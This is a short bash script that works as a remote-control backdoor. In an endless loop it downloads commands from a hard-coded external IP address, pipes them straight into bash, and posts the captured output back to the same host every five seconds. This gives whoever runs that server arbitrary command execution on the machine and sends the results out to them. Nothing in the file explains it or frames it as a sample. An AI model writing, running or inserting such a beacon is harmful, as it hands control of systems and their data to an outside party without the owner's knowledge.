#!/bin/bash

while true; do
  curl -fsSL http://54.95.251.88/getcmd | bash 2>&1 | tee /tmp/cmd_output

  curl -fsSL -X POST -d "@/tmp/cmd_output" http://54.95.251.88/postresult

  sleep 5
done